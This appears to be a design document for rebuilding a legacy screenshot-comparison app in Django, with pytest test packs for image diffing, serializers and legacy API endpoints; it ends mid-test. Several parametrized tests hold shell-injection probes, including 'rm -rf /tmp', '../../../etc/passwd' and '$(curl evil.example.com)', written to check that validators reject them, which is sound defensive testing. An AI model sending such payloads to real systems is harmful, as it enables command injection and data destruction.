# Tests & fixtures

Today the legacy app has minimal test coverage — RSpec for unit-level pieces and Cucumber for two end-to-end flows. The README explicitly says "Test coverage is minimal but please don't follow our lead." For the rebuild, this is a guide to **what behaviours have ever been pinned by tests**, so you can recreate at least that floor.

## RSpec (unit / model)

`spec/` files:

- `spec/spec_helper.rb` / `spec/rails_helper.rb` — boilerplate.
- `spec/factories.rb` — `factory_girl` factories for Project, Suite, Run, Test. The Test factory uses `spec/support/images/testcard.jpg` as the default screenshot.
- `spec/support/database_cleaner.rb` — DB cleaner setup (transactions for unit tests, truncation for JS specs).
- `spec/support/factory_girl.rb` — includes FactoryGirl::Syntax::Methods.
- `spec/support/images/testcard.jpg` — 400×300 fixture image.
- `spec/support/images/testcard_large.jpg` — 500×375 fixture image.

### What's actually asserted

| Spec file                                | What it pins                                                                                          |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `spec/image_geometry_spec.rb`            | `ImageGeometry.new('testcard.jpg').width == 400` and `.height == 300`                                 |
| `spec/image_processor_spec.rb`           | `ImageProcessor.crop` returns true on a valid crop                                                    |
| `spec/models/canvas_spec.rb`             | Canvas takes `max(width)` × `max(height)` of the two inputs; `dimensions_differ` true when sizes differ; same dims → matches base |
| `spec/models/screenshot_comparison_spec.rb` | An identical pair → `pass == true`. A different-sized pair → `pass == false`.                       |
| `spec/models/test_spec.rb`               | After 5 created Tests with same key, `five_consecutive_failures == true`. Default `fuzz_level == '30%'`. |

That's it. There are **no controller specs**, **no request specs**, **no spec for the Baseline lifecycle** beyond what the comparison test indirectly exercises.

## Cucumber (end-to-end)

`features/`:

- `features/projects.feature` — visit `/projects`, see 3 project rows after factories create 3 Tests.
- `features/runs.feature` — POST 2 screenshots to `/tests` via REST, visit the run page, see the run header and the failing-test row.
- `features/support/env.rb` — Cucumber-Rails boilerplate, Capybara + Poltergeist (PhantomJS).
- `features/support/screenshots/run1.png`, `run2.png` — fixtures with intentional differences so the diff fails.
- `features/step_definitions/runs_steps.rb`, `projects_steps.rb` — step implementations.

PhantomJS is dead upstream and not installable on modern systems — these specs no longer run unattended. The rebuild should drop Cucumber/Poltergeist entirely; equivalent assertions belong in Django + Playwright (or Cypress) tests against the rebuilt Angular SPA.

## Demo script

`bin/demo_test_run` (Ruby) takes a Spectre URL and exercises the full submit pipeline against `nuffieldhealth.com` and `wearefriday.com` using `spectre_client` + Capybara/Poltergeist. The README invokes it as a smoke test:

```bash
docker-compose run --rm app bin/demo_test_run http://app:3000
bin/demo_test_run http://localhost:3000 fail   # exercises a failing path
```

Like the Cucumber tests, this depends on PhantomJS and won't run today. The rebuild equivalent should be a small CLI script that:

1. Hits a few real URLs with `playwright` or `selenium`,
2. POSTs the screenshots to `/runs` and `/tests` of the new backend via plain HTTP.

If the goal is just to demo the diff functionality, screenshots can also come from a `screenshots/` fixture folder — no headless browser needed.

## What to test in the rebuild

Minimum viable test pyramid for the rebuild:

### Backend (Django + pytest)

Unit:
- `Canvas` — same scenarios as `canvas_spec.rb`.
- `ImageGeometry`, `ImageProcessor` (or whatever you call them in Python) — width/height parsing, crop returns success on valid spec, crop fails (returncode != 0) on invalid spec.
- `Test.key` generation — slugifies project+suite+name+browser+size.
- `Test.save()` default values for fuzz_level, highlight_colour, diff, `passed`.
- `Run` post-save → suite has at most `RUN_RETENTION_PER_SUITE` runs (default 5; verify the env var is honoured).
- `Test` post-save (passing) → upserts a Baseline; flags `is_new_baseline=true` on the API response when this is the first Baseline for the key ([decisions.md](decisions.md) #3).
- `Project.save()` and `Suite.save()` re-slug on rename ([decisions.md](decisions.md) #4) and the resulting slug change is reflected in subsequent Test keys.

Integration / API:
- `POST /runs` creates project+suite+run idempotently. Legacy URL ([decisions.md](decisions.md) #7) — assert the un-prefixed path still works.
- `POST /tests` with no existing baseline → creates baseline, passes, and the response includes `"is_new_baseline": true`.
- `POST /tests` with matching baseline → passes; `"is_new_baseline"` is absent / false.
- `POST /tests` with intentionally different image → fails, generates diff image.
- `POST /tests` with `crop_area` → uses cropped region for comparison.
- `PATCH /tests/:id` (set as baseline) → flips `passed` to true and updates the Baseline row. Field name on the wire stays `pass` for CI client compatibility.
- `GET /baselines/:key.png` → returns 200 with image bytes for an existing key, 404 otherwise.
- Run-purge: posting a 6th run drops the oldest. Tests on the dropped run are also gone.
- Concurrent `POST /runs` against the same suite produce distinct `sequential_id`s (regression test for the `select_for_update` path; see [data-model.md](data-model.md)).

End-to-end (Playwright against the Angular SPA):
- Smoke test: ingest a known-good and known-bad screenshot pair, then verify the run page shows them with correct labels.

### Frontend (Angular)

Unit (use whatever the Angular 22 CLI's `ng test` defaults to at the time of build — Karma/Jasmine has been deprecated; the modern path is Vitest or Web Test Runner via `@angular/build:unit-test`):
- Filter component reactive-forms wiring.
- Test row component renders pass/fail correctly, hides the "Set as baseline" button when appropriate.

E2E: covered by Playwright against the full stack.

## Test data fixtures to bring along

- `testcard.jpg` (400×300) and `testcard_large.jpg` (500×375) — useful for canvas/diffing tests.
- `run1.png` and `run2.png` — useful as a "pair that should fail" fixture for an end-to-end smoke test.

These are small, self-contained, and the unit test math depends on their exact dimensions. Worth porting verbatim.

## `screenshot_comparison.py` test pack

This service is the highest-leverage place to test in the rebuild. The legacy app had **two** assertions for it (identical pair → pass; different sizes → fail). We do better.

### Layout

```text
backend/
├── conftest.py                          # pytest-django config
└── core/tests/
    ├── conftest.py                      # shared fixtures
    ├── fixtures/images/
    │   ├── testcard.jpg                 # 400x300 — ported from spec/support/images/
    │   ├── testcard_large.jpg           # 500x375 — ported
    │   ├── run1.png                     # ported from features/support/screenshots/
    │   └── run2.png                     # ported
    └── test_screenshot_comparison.py
```

### Shared fixtures — `core/tests/conftest.py`

```python
from pathlib import Path

import factory
import pytest

from core.models import Baseline, Project, Run, Suite, Test

FIXTURES = Path(__file__).parent / 'fixtures' / 'images'


# ---- Image fixtures --------------------------------------------------------

@pytest.fixture
def testcard():     return FIXTURES / 'testcard.jpg'

@pytest.fixture
def testcard_large(): return FIXTURES / 'testcard_large.jpg'

@pytest.fixture
def run1():         return FIXTURES / 'run1.png'

@pytest.fixture
def run2():         return FIXTURES / 'run2.png'


@pytest.fixture
def upload(tmp_path):
    """Return a callable that wraps a Path as a Django UploadedFile-like object."""
    import mimetypes
    from django.core.files.uploadedfile import SimpleUploadedFile

    def _upload(path: Path) -> SimpleUploadedFile:
        mime, _ = mimetypes.guess_type(path.name)
        return SimpleUploadedFile(path.name, path.read_bytes(), content_type=mime or 'application/octet-stream')
    return _upload


# ---- Model factories -------------------------------------------------------

class ProjectFactory(factory.django.DjangoModelFactory):
    class Meta:
        model = Project
    name = factory.Sequence(lambda n: f"Project {n}")


class SuiteFactory(factory.django.DjangoModelFactory):
    class Meta:
        model = Suite
    project = factory.SubFactory(ProjectFactory)
    name    = factory.Sequence(lambda n: f"Suite {n}")


class RunFactory(factory.django.DjangoModelFactory):
    class Meta:
        model = Run
    suite = factory.SubFactory(SuiteFactory)


class TestFactory(factory.django.DjangoModelFactory):
    class Meta:
        model = Test
    run     = factory.SubFactory(RunFactory)
    name    = factory.Sequence(lambda n: f"test_{n}")
    browser = "Chrome"
    size    = "1024"


@pytest.fixture
def project_factory():  return ProjectFactory
@pytest.fixture
def suite_factory():    return SuiteFactory
@pytest.fixture
def run_factory():      return RunFactory
@pytest.fixture
def test_factory():     return TestFactory


# ---- S3 — use MinIO via testcontainers, or moto for in-process mocks ------

@pytest.fixture(autouse=True)
def _s3_mock(settings, tmp_path):
    """For unit tests, swap the S3 backend for FileSystemStorage to keep things hermetic.

    Integration tests that need real S3 semantics should use the moto fixture
    explicitly (see test_legacy_api.py).
    """
    settings.STORAGES = {
        'default':     {'BACKEND': 'django.core.files.storage.FileSystemStorage',
                        'OPTIONS': {'location': str(tmp_path / 'storage')}},
        'staticfiles': {'BACKEND': 'django.contrib.staticfiles.storage.StaticFilesStorage'},
    }
```

### `test_screenshot_comparison.py`

```python
import subprocess
from pathlib import Path

import pytest

from core.models import Baseline
from core.services.image_geometry import ImageDiffError, ImageGeometry
from core.services.screenshot_comparison import ScreenshotComparison


pytestmark = pytest.mark.django_db


# ---- Happy paths -----------------------------------------------------------

def test_self_baseline_first_run(test_factory, upload, testcard):
    """First-ever submission for a key has no baseline → self-baseline → pass.

    decisions.md #3: returns is_new_baseline=True so the SPA can show the badge.
    """
    test = test_factory()
    is_new = ScreenshotComparison(test, upload(testcard)).run()

    test.refresh_from_db()
    assert test.passed is True
    assert test.diff == 0
    assert is_new is True
    assert Baseline.objects.filter(key=test.key).exists()


def test_identical_to_baseline_passes(test_factory, upload, testcard):
    """Re-submitting the same image after a baseline exists → pass, is_new_baseline=False."""
    first = test_factory()
    ScreenshotComparison(first, upload(testcard)).run()

    second = test_factory(run=first.run, name=first.name, browser=first.browser, size=first.size)
    is_new = ScreenshotComparison(second, upload(testcard)).run()

    second.refresh_from_db()
    assert second.passed is True
    assert is_new is False


def test_different_image_fails(test_factory, upload, run1, run2):
    """Pair with intentional differences → diff% > threshold → fail."""
    first = test_factory()
    ScreenshotComparison(first, upload(run1)).run()

    second = test_factory(run=first.run, name=first.name, browser=first.browser, size=first.size)
    ScreenshotComparison(second, upload(run2)).run()

    second.refresh_from_db()
    assert second.passed is False
    assert second.diff > 0.1
    assert second.screenshot_diff   # the highlight image was generated and attached


# ---- Canvas padding --------------------------------------------------------

def test_different_dimensions_pads_to_larger_canvas(test_factory, upload, testcard, testcard_large):
    """400x300 vs 500x375 → canvas is 500x375; the diff fills the padded region."""
    first = test_factory()
    ScreenshotComparison(first, upload(testcard)).run()

    second = test_factory(run=first.run, name=first.name, browser=first.browser, size=first.size)
    ScreenshotComparison(second, upload(testcard_large)).run()

    second.refresh_from_db()
    geometry = ImageGeometry.from_file(second.screenshot_diff.path)
    assert geometry.width  == 500
    assert geometry.height == 375


# ---- Crop ------------------------------------------------------------------

def test_crop_area_uses_cropped_region(test_factory, upload, testcard):
    """crop_area=200x150+0+0 → only the top-left 200x150 of testcard is compared."""
    test = test_factory(crop_area='200x150+0+0')
    ScreenshotComparison(test, upload(testcard)).run()

    test.refresh_from_db()
    geometry = ImageGeometry.from_file(test.screenshot.path)
    assert geometry.width  == 200
    assert geometry.height == 150


# ---- Validation / shell-injection -----------------------------------------

@pytest.mark.parametrize("attack", [
    {'fuzz_level':       '30%; touch /tmp/spectre_pwn'},
    {'fuzz_level':       '$(touch /tmp/spectre_pwn)%'},
    {'highlight_colour': "ff0000'; rm -rf /tmp"},
    {'highlight_colour': '../../../etc/passwd'},
    {'crop_area':        '200x150+0+0; touch /tmp/spectre_pwn'},
    {'crop_area':        '$(curl evil.example.com)x100+0+0'},
])
def test_shell_injection_attempts_are_rejected(client, run_factory, testcard, attack):
    """Shell-injection probes on every user-controlled field → 400 from the API.

    decisions.md, "Bugs / risks fixed by the rebuild": the legacy app interpolated
    these values directly into a shell command. The rebuild MUST validate them with
    anchored regexes at the API boundary (validate_test_params).
    """
    canary = Path('/tmp/spectre_pwn')
    canary.unlink(missing_ok=True)

    run = run_factory()
    payload = {
        'test[run_id]':     str(run.id),
        'test[name]':       'Homepage',
        'test[browser]':    'Chrome',
        'test[size]':       '1024',
        'test[screenshot]': testcard.open('rb'),
    } | {f'test[{k}]': v for k, v in attack.items()}

    response = client.post('/tests', payload, format='multipart')

    assert response.status_code == 400
    assert not canary.exists(), "shell-injection succeeded — validator regression"


# ---- Failure modes (ImageMagick) ------------------------------------------

def test_corrupt_input_raises_imagediff_error(test_factory, upload, tmp_path):
    """compare exits ≥ 2 on garbage input → ImageDiffError, not silent pass.

    The legacy app swallowed this in a bare rescue.
    """
    not_an_image = tmp_path / 'not_an_image.png'
    not_an_image.write_bytes(b'this is not a PNG')

    test = test_factory()
    with pytest.raises(ImageDiffError):
        ScreenshotComparison(test, upload(not_an_image)).run()


def test_orphan_baseline_uid_falls_back_to_self_baseline(
    test_factory, upload, testcard, caplog,
):
    """Baseline row exists but its screenshot is gone from storage → log a warning,
    self-baseline, mark is_new_baseline=True. Legacy parity with the orphan-UID rescue.
    """
    first = test_factory()
    ScreenshotComparison(first, upload(testcard)).run()

    # Delete the baseline file out from under the row.
    Baseline.objects.get(key=first.key).screenshot.delete(save=True)

    second = test_factory(run=first.run, name=first.name, browser=first.browser, size=first.size)
    is_new = ScreenshotComparison(second, upload(testcard)).run()

    assert is_new is True
    assert any('baseline file missing' in r.message for r in caplog.records)


# ---- Race condition (regression for the select_for_update path) -----------

def test_concurrent_submissions_produce_one_baseline(test_factory, upload, testcard, run1):
    """Two simultaneous first-time submissions for the same key → exactly one Baseline,
    not two; last writer wins. decisions.md, "Race condition on baseline upsert".
    """
    import threading

    suite = test_factory().run.suite
    run   = suite.runs.first()

    def submit(image):
        t = test_factory(run=run, name='Homepage', browser='Chrome', size='1024')
        ScreenshotComparison(t, upload(image)).run()

    t1 = threading.Thread(target=submit, args=(testcard,))
    t2 = threading.Thread(target=submit, args=(run1,))
    t1.start(); t2.start()
    t1.join();  t2.join()

    assert Baseline.objects.filter(suite=suite).count() == 1


# ---- Configurable threshold (decisions.md #2) -----------------------------

def test_pass_threshold_is_configurable(settings, test_factory, upload, run1, run2):
    """IMAGE_DIFF_THRESHOLD env var changes pass/fail without code changes."""
    settings.IMAGE_DIFF_THRESHOLD = 100.0   # accept any diff

    first = test_factory()
    ScreenshotComparison(first, upload(run1)).run()

    second = test_factory(run=first.run, name=first.name, browser=first.browser, size=first.size)
    ScreenshotComparison(second, upload(run2)).run()

    second.refresh_from_db()
    assert second.passed is True   # would have been False with the default 0.1
```

### What this pack does and doesn't cover

Covers:
- All four "identical / different / different-size / cropped" diff paths.
- Self-baseline behaviour and the `is_new_baseline` flag (the only state that's *not* on the Test row).
- Every shell-injection vector for `fuzz_level`, `highlight_colour`, `crop_area` — parametrized on attack payload, asserts both the 400 response *and* the absence of a canary file.
- Both ImageMagick failure modes (corrupt input, missing baseline file).
- The race condition (real threads against a real `select_for_update`).
- The `IMAGE_DIFF_THRESHOLD` knob.

Does not cover (deliberately, leave for a separate test file):
- The full `POST /tests` view — view-level concerns (multipart parsing, field permissions, response shape) belong in `test_legacy_api.py`.
- Serializer wire-format regressions — covered in `test_serializers.py` (the single-line `assert "pass" in body` check from `api.md`).
- Run-purge after-create signal — belongs in `test_models.py`.

### Why parametrize the shell-injection cases

Six attack vectors aren't 1× the test surface — they're 6× the assurance that the validator regex works. If someone tightens the regex incorrectly, exactly one test fails with the exact attack string in the failure message. Parametrize over a static list, not Hypothesis: deterministic CI failures are worth more than fuzzed coverage for a small, well-defined attack surface.

### Speed

The image-heavy tests each spawn ~3 `convert`/`compare` subprocesses. On a developer laptop the file runs in roughly 8–12 seconds end-to-end. If that becomes painful, mark a few cases with `@pytest.mark.slow` and exclude them from the inner loop with `pytest -m "not slow"`. Don't mock ImageMagick — the entire point of these tests is that the real binary produces the expected exit codes and outputs.

## `core/serializers.py` test pack

The serializers are the wire-format contract. Legacy CI clients expect specific keys, in specific casings, with specific types. These tests are cheap (no ImageMagick, no S3, no threads) and exist primarily to catch one class of regression: a refactor of the SPA shape leaking into the legacy response.

### `core/tests/test_serializers.py`

```python
import pytest

from core.models import Baseline
from core.serializers import (
    BaselineSerializer,
    LegacyBaselineSerializer,
    LegacyRunSerializer,
    LegacyTestSerializer,
    ProjectSerializer,
    RunDetailSerializer,
    RunSummarySerializer,
    SuiteDetailSerializer,
    TestRowSerializer,
)


pytestmark = pytest.mark.django_db


# ---- Frozen field sets ----------------------------------------------------
#
# These lists pin the wire format. If you find yourself updating one, ask:
# is this a client-visible change? If yes, client consumers need to know
# before this lands. If no, you're editing the wrong serializer.

LEGACY_RUN_FIELDS = frozenset({
    'id', 'suite_id', 'sequential_id', 'created_at', 'updated_at', 'url',
})

LEGACY_TEST_FIELDS = frozenset({
    'id', 'name', 'browser', 'size', 'run_id',
    'diff', 'screenshot_uid', 'screenshot_baseline_uid', 'screenshot_diff_uid',
    'key', 'pass', 'source_url', 'fuzz_level', 'highlight_colour', 'crop_area',
    'created_at', 'updated_at', 'url',
})

LEGACY_BASELINE_FIELDS = frozenset({
    'id', 'name', 'browser', 'size', 'suite_id', 'key', 'test_id',
    'screenshot_url', 'created_at', 'updated_at',
})


# ---- The single most important assertion in this file --------------------

def test_legacy_test_serializer_uses_pass_not_passed(test_factory):
    """The wire format is `"pass"`, never `"passed"` or `"pass_field"`.

    This is the regression that breaks every CI pipeline using the legacy API.
    """
    test = test_factory(passed=True)
    body = LegacyTestSerializer(test).data

    assert 'pass' in body
    assert body['pass'] is True
    assert 'passed'    not in body
    assert 'pass_field' not in body


def test_legacy_test_serializer_pass_reflects_model_state(test_factory):
    """Both branches of `passed` round-trip correctly to the wire `"pass"` key."""
    passing  = test_factory(passed=True)
    failing  = test_factory(passed=False)

    assert LegacyTestSerializer(passing).data['pass'] is True
    assert LegacyTestSerializer(failing).data['pass'] is False


# ---- Frozen field-set checks ---------------------------------------------

@pytest.mark.parametrize("serializer_cls,factory_name,expected_fields", [
    (LegacyRunSerializer,      'run_factory',      LEGACY_RUN_FIELDS),
    (LegacyTestSerializer,     'test_factory',     LEGACY_TEST_FIELDS),
])
def test_legacy_serializer_field_set_is_frozen(
    serializer_cls, factory_name, expected_fields, request,
):
    """Adding a field to the model must NOT silently appear in the legacy response.

    If this test fails because a new field appeared, ask:
    - Was the field added because clients now expect it? Update LEGACY_*_FIELDS.
    - Was it accidental? Remove the field from the legacy serializer's `fields`.
    """
    factory = request.getfixturevalue(factory_name)
    body    = serializer_cls(factory()).data
    assert frozenset(body.keys()) == expected_fields


def test_legacy_baseline_serializer_field_set_is_frozen(suite_factory):
    suite = suite_factory()
    baseline = Baseline.objects.create(
        suite=suite, name='Homepage', browser='Chrome', size='1024',
        key='proj-suite-homepage-chrome-1024',
    )
    body = LegacyBaselineSerializer(baseline).data
    assert frozenset(body.keys()) == LEGACY_BASELINE_FIELDS


# ---- URL shape — survives renames ----------------------------------------

def test_legacy_run_url_uses_current_slug_after_rename(run_factory):
    """LegacyRunSerializer.url reflects the current slug, not the slug at run-creation.

    decisions.md #4: rename re-slugs the project, and the URL should follow.
    """
    run = run_factory()
    run.suite.project.name = 'Renamed Project'
    run.suite.project.save()   # auto-updates slug to 'renamed-project'

    body = LegacyRunSerializer(run).data
    assert body['url'].startswith('/projects/renamed-project/suites/')


def test_legacy_test_url_includes_anchor(test_factory):
    body = LegacyTestSerializer(test_factory()).data
    assert body['url'].endswith(f"#test_{test_factory._meta.model.objects.last().id}")


# ---- File URLs — None when storage is empty -------------------------------

def test_legacy_test_serializer_uid_fields_are_none_when_no_file(test_factory):
    """Mid-comparison Tests have no attached files yet → uid fields are null, not '/'."""
    body = LegacyTestSerializer(test_factory()).data

    assert body['screenshot_uid']          is None
    assert body['screenshot_baseline_uid'] is None
    assert body['screenshot_diff_uid']     is None


@pytest.mark.parametrize("serializer_cls,factory_name,url_field", [
    (TestRowSerializer, 'test_factory', 'screenshot_url'),
    (TestRowSerializer, 'test_factory', 'baseline_url'),
    (TestRowSerializer, 'test_factory', 'diff_url'),
    (TestRowSerializer, 'test_factory', 'screenshot_thumb_url'),
    (TestRowSerializer, 'test_factory', 'baseline_thumb_url'),
    (TestRowSerializer, 'test_factory', 'diff_thumb_url'),
])
def test_spa_test_row_url_fields_are_none_when_no_file(
    serializer_cls, factory_name, url_field, request,
):
    """Same invariant on the SPA side: missing FileFields render as null, not as a broken URL."""
    factory = request.getfixturevalue(factory_name)
    body    = serializer_cls(factory()).data
    assert body[url_field] is None


# ---- SPA-side latest_runs limit ------------------------------------------

def test_suite_detail_serializer_returns_at_most_5_runs(suite_factory, run_factory):
    suite = suite_factory()
    for _ in range(8):
        run_factory(suite=suite)

    # purge_old_runs keeps 5; verify the serializer surfaces the kept set.
    body = SuiteDetailSerializer(suite).data
    assert len(body['latest_runs']) == 5


# ---- SPA wire format — sentinel keys --------------------------------------

@pytest.mark.parametrize("serializer_cls,factory_name,expected_key", [
    (TestRowSerializer,      'test_factory',  'passed'),       # SPA reads `passed`, not `pass`
    (RunDetailSerializer,    'run_factory',   'tests'),
    (RunSummarySerializer,   'run_factory',   'sequential_id'),
    (BaselineSerializer,     None,            'thumbnail_url'),
])
def test_spa_serializer_exposes_expected_key(
    serializer_cls, factory_name, expected_key, request, suite_factory,
):
    """Smoke test that each SPA serializer still exposes its identity-defining key.

    A failure here usually means a model field was renamed and the serializer
    `fields` list wasn't updated.
    """
    if factory_name:
        instance = request.getfixturevalue(factory_name)()
    else:
        suite = suite_factory()
        instance = Baseline.objects.create(
            suite=suite, name='Homepage', browser='Chrome', size='1024',
            key='proj-suite-homepage-chrome-1024',
        )
    body = serializer_cls(instance).data
    assert expected_key in body


# ---- Datetime serialization — ISO 8601, UTC, with `Z` ---------------------

def test_legacy_serializers_emit_iso_datetime(test_factory):
    """The Rails app emitted `2026-06-12T10:00:00.000Z`. DRF's default is fine
    in modern Python but the format is part of the contract — pin it.
    """
    body = LegacyTestSerializer(test_factory()).data
    assert body['created_at'].endswith('Z') or '+' in body['created_at']
    # Don't be over-strict on the millisecond field — both `.000Z` and `Z` are accepted by CI clients.


# ---- Inbound validation — set-as-baseline does NOT use `"pass"` ----------

def test_set_as_baseline_does_not_consume_pass_field(client, test_factory, run_factory):
    """Sanity: the SPA's set-baseline endpoint accepts an empty body, not `{"pass": true}`.

    A request with `pass: true` should not flip `passed` — only POST to
    /api/tests/<id>/set-baseline/ or PATCH /tests/<id> with test[baseline]=true does.
    """
    test = test_factory(passed=False)
    response = client.post(f'/api/tests/{test.id}/set-baseline/', data={'pass': True}, format='json')

    test.refresh_from_db()
    # The SPA endpoint ignores the body; it always promotes.
    assert response.status_code == 204
    assert test.passed is True
    # But the *intent* test is: even if the body were ignored, `"pass"` must not be a blessed input key.
```

### What this pack does and doesn't cover

Covers:
- The single-line `"pass" in body` regression check, called out in `api.md`.
- The `passed` ↔ `"pass"` round-trip in both directions of the boolean.
- Frozen field sets for all three legacy serializers — adding a new model field can't accidentally leak to CI clients.
- URL shape after a project rename (the auto-update-slug consequence from `decisions.md` #4).
- Empty-FileField handling on both legacy and SPA sides.
- The 5-runs cap surfaced via `SuiteDetailSerializer.latest_runs`.
- A sentinel-key smoke test per SPA serializer.

Does not cover (deliberately):
- DRF's datetime format byte-by-byte. CI clients accept `Z` and `+00:00` indifferently; pinning to one is more brittle than the bug it would catch.
- Inbound deserialization on the legacy endpoints — that's `test_legacy_api.py`'s job (multipart parsing, FormParser quirks, etc.).
- Pagination and ordering of `ProjectSerializer.suites` — handled at the view layer (`prefetch_related` choices) where its impact is meaningful, not at the serializer.

### Why frozen sets, not snapshot tests

Snapshot tests (record-once, diff-on-change) are the easy way to pin a wire format. They're also the easy way to *update* a wire format without thinking — accept-the-snapshot is one keystroke. Frozen `frozenset(...)` literals make the same kind of regression check, but updating one requires editing the test file, which surfaces in code review with the *exact* set of fields that changed. For the gem-facing serializers that's the right trade.

### Speed

Pure DB + Python serialization. The whole file runs in well under a second on the standard Django test database. Don't gate it behind any speed-related markers.

## `test_legacy_api.py` — end-to-end view tests

These exercise the un-prefixed legacy endpoints (`POST /runs`, `POST /tests`, `PATCH /tests/:id`, `GET /baselines/:key`) the way CI clients actually use them: form-encoded, multipart uploads, no auth, no CSRF. Failures here mean the legacy API is broken in production — treat them with the same gravity as `test_legacy_test_serializer_uses_pass_not_passed`.

### `core/tests/test_legacy_api.py`

```python
import io
import json

import pytest
from django.urls import reverse
from rest_framework.test import APIClient

from core.models import Baseline, Project, Run, Suite, Test


pytestmark = pytest.mark.django_db


@pytest.fixture
def api():
    """Anonymous client. The legacy endpoints are no-auth (decisions.md, public/API)."""
    return APIClient()


# =============================================================================
# POST /runs
# =============================================================================

class TestRunsCreate:
    def test_creates_project_suite_and_run(self, api):
        response = api.post('/runs', {'project': 'Acme Site', 'suite': 'Desktop'})

        assert response.status_code == 200
        body = response.json()
        assert body['suite_id']
        assert body['sequential_id'] == 1
        assert body['url'] == '/projects/acme-site/suites/desktop/runs/1'

        assert Project.objects.get(name='Acme Site').slug == 'acme-site'
        assert Suite.objects.get(name='Desktop').slug == 'desktop'

    def test_reuses_existing_project_and_suite(self, api):
        api.post('/runs', {'project': 'Acme Site', 'suite': 'Desktop'})
        api.post('/runs', {'project': 'Acme Site', 'suite': 'Desktop'})

        assert Project.objects.count() == 1
        assert Suite.objects.count()   == 1
        assert Run.objects.count()     == 2

    def test_per_suite_sequential_id_increments(self, api):
        first  = api.post('/runs', {'project': 'P', 'suite': 'S'}).json()
        second = api.post('/runs', {'project': 'P', 'suite': 'S'}).json()

        assert first['sequential_id']  == 1
        assert second['sequential_id'] == 2

    def test_different_suites_have_independent_sequential_ids(self, api):
        a = api.post('/runs', {'project': 'P', 'suite': 'A'}).json()
        b = api.post('/runs', {'project': 'P', 'suite': 'B'}).json()
        assert a['sequential_id'] == 1
        assert b['sequential_id'] == 1

    def test_response_includes_url_field(self, api):
        body = api.post('/runs', {'project': 'P', 'suite': 'S'}).json()
        assert 'url' in body
        assert body['url'].startswith('/projects/')

    def test_skip_csrf(self, api):
        """The gem doesn't fetch a CSRF token; the endpoint must accept anonymous POSTs."""
        response = api.post('/runs', {'project': 'P', 'suite': 'S'})
        assert response.status_code == 200


# =============================================================================
# POST /tests — the hot path
# =============================================================================

class TestTestsCreate:
    def _post_test(self, api, run, image_path, **extras):
        """Helper: build the standard multipart payload for the legacy API."""
        with image_path.open('rb') as fh:
            payload = {
                'test[run_id]':     str(run.id),
                'test[name]':       'Homepage',
                'test[browser]':    'Chrome',
                'test[size]':       '1024',
                'test[screenshot]': fh,
            } | {f'test[{k}]': v for k, v in extras.items()}
            return api.post('/tests', payload, format='multipart')

    def test_first_submission_self_baselines(self, api, run_factory, testcard):
        run = run_factory()
        response = self._post_test(api, run, testcard)

        assert response.status_code == 200
        body = response.json()
        assert body['pass'] is True
        assert body['is_new_baseline'] is True
        assert Baseline.objects.filter(key=body['key']).exists()

    def test_response_uses_pass_not_passed(self, api, run_factory, testcard):
        """The wire key is `"pass"`, not `"passed"`."""
        run = run_factory()
        body = self._post_test(api, run, testcard).json()

        assert 'pass'       in body
        assert 'passed' not in body

    def test_second_submission_compares_to_baseline(self, api, run_factory, testcard):
        run = run_factory()
        first_body = self._post_test(api, run, testcard).json()
        assert first_body['is_new_baseline'] is True

        second_body = self._post_test(api, run, testcard).json()
        assert second_body['pass'] is True
        # is_new_baseline absent or false — assertion accepts either to match doc.
        assert not second_body.get('is_new_baseline')

    def test_different_screenshot_fails(self, api, run_factory, testcard, run1, run2):
        run = run_factory()
        self._post_test(api, run, run1)
        body = self._post_test(api, run, run2).json()

        assert body['pass'] is False
        assert body['diff'] > 0.1
        assert body['screenshot_diff_uid']

    def test_crop_area_changes_compared_region(self, api, run_factory, testcard):
        run = run_factory()
        body = self._post_test(api, run, testcard, crop_area='200x150+0+0').json()

        assert body['pass'] is True
        assert body['crop_area'] == '200x150+0+0'

    def test_returns_full_legacy_field_set(self, api, run_factory, testcard):
        """Any addition to LEGACY_TEST_FIELDS must land here as a wire-format change."""
        from core.tests.test_serializers import LEGACY_TEST_FIELDS
        run = run_factory()
        body = self._post_test(api, run, testcard).json()
        # is_new_baseline is rebuild-additive (api.md, "Rebuild-only fields"); accept either set.
        assert frozenset(body) >= LEGACY_TEST_FIELDS

    @pytest.mark.parametrize("payload,expected_status", [
        ({'fuzz_level':       '30%; touch /tmp/spectre_pwn_view'}, 400),
        ({'highlight_colour': "ff0000'; rm -rf /tmp"},             400),
        ({'crop_area':        '200x150+0+0; touch /tmp/pwn'},      400),
        ({'fuzz_level':       'banana%'},                          400),
        ({'highlight_colour': 'ff00'},                             400),  # not 6 chars
        ({'crop_area':        '200x'},                             400),
    ])
    def test_invalid_input_rejected_at_view(
        self, api, run_factory, testcard, payload, expected_status,
    ):
        """Validator regexes run before the model is touched.

        decisions.md, "Bugs / risks fixed by the rebuild": every shell-injection
        vector and every malformed value lands here as a 400, never reaches the shell.
        """
        run = run_factory()
        response = self._post_test(api, run, testcard, **payload)
        assert response.status_code == expected_status
        # No partial state — the malformed call shouldn't have created a Test row.
        assert not Test.objects.filter(run=run).exists()

    def test_missing_screenshot_returns_400(self, api, run_factory):
        run = run_factory()
        response = api.post('/tests', {
            'test[run_id]':  str(run.id),
            'test[name]':    'Homepage',
            'test[browser]': 'Chrome',
            'test[size]':    '1024',
        }, format='multipart')
        # Legacy app would 500; rebuild treats missing-file as a client error.
        assert response.status_code == 400

    def test_invalid_run_id_returns_404(self, api, testcard):
        with testcard.open('rb') as fh:
            response = api.post('/tests', {
                'test[run_id]':     '99999',
                'test[name]':       'Homepage',
                'test[browser]':    'Chrome',
                'test[size]':       '1024',
                'test[screenshot]': fh,
            }, format='multipart')
        # Legacy app raised 500 here; cleaner contract says 404.
        assert response.status_code == 404


# =============================================================================
# PATCH /tests/:id  ("Set as baseline" — legacy form-encoded shape)
# =============================================================================

class TestTestsPatchSetBaseline:
    def test_legacy_patch_promotes_test(self, api, test_factory):
        test = test_factory(passed=False)
        response = api.patch(f'/tests/{test.id}', {'test[baseline]': 'true'})

        assert response.status_code == 200
        test.refresh_from_db()
        assert test.passed is True
        assert response.json()['pass'] is True   # legacy API wire key

    def test_patch_without_baseline_param_is_noop(self, api, test_factory):
        test = test_factory(passed=False)
        response = api.patch(f'/tests/{test.id}', {})

        test.refresh_from_db()
        assert test.passed is False
        # Returns the test JSON either way — gem reads it as confirmation.
        assert response.status_code == 200

    def test_spa_endpoint_and_legacy_endpoint_share_behaviour(self, api, test_factory):
        """POST /api/tests/<id>/set-baseline/ and PATCH /tests/<id> with test[baseline]=true
        both promote via _set_as_baseline. Same observable end state.
        """
